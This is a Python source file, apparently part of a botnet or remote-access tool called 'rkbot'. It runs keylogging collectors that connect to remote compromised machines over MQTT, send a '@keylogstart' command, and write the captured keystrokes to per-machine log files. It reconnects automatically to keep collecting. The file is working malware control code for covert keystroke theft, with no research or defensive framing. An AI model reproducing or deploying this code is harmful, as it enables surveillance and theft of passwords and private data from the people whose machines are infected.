import asyncio
import logging
import os
import threading
import time

import machines
import mqtt

log = logging.getLogger("rkbot.keylog")

DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keystrokes")
os.makedirs(DIR, exist_ok=True)

collectors = {}


def path(alias):
	p = os.path.join(DIR, f"{alias}.log")
	return p if os.path.exists(p) else None


class Collector:
	def __init__(self, alias, mid, pub):
		self.alias = alias
		self.mid = mid
		self.pub = pub
		self.path = os.path.join(DIR, f"{alias}.log")
		self.lock = threading.Lock()
		self.task = None
		self.session = None
		self.stopping = False
		self.header()

	def header(self):
		with self.lock:
			with open(self.path, "ab") as f:
				f.write(f"\n--- keylog {self.alias} {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n".encode())
			os.chmod(self.path, 0o600)

	def append(self, data):
		if not data:
			return
		with self.lock:
			with open(self.path, "ab") as f:
				f.write(data)

	async def run(self):
		loop = asyncio.get_event_loop()
		while not self.stopping:
			try:
				await machines.keylog(self.mid)
			except Exception:
				pass
			try:
				sess = await loop.run_in_executor(
					None, lambda: mqtt.Session(self.mid, self.pub))
			except OSError as e:
				log.info("keylog connect %s: %s", self.alias, e)
				await asyncio.sleep(10)
				continue
			self.session = sess
			sess.on_keylog = self.append
			try:
				await loop.run_in_executor(
					None, lambda: sess.send("@keylogstart", timeout=15))
			except Exception:
				pass
			while not self.stopping:
				await asyncio.sleep(10)
				try:
					await machines.keylog(self.mid)
				except Exception:
					pass
				if time.time() - sess.last_seen > 45:
					break
			try:
				sess.close()
			except Exception:
				pass
			self.session = None
			if not self.stopping:
				await asyncio.sleep(5)

	def stop(self):
		self.stopping = True
		if self.session is not None:
			try:
				self.session.close()
			except Exception:
				pass
		if self.task is not None:
			self.task.cancel()


async def start(alias, mid, pub):
	c = collectors.get(alias)
	if c is not None and c.task is not None and not c.task.done():
		return False
	c = Collector(alias, mid, pub)
	c.task = asyncio.create_task(c.run())
	collectors[alias] = c
	return True


def stop(alias):
	c = collectors.pop(alias, None)
	if c is None:
		return False
	c.stop()
	return True
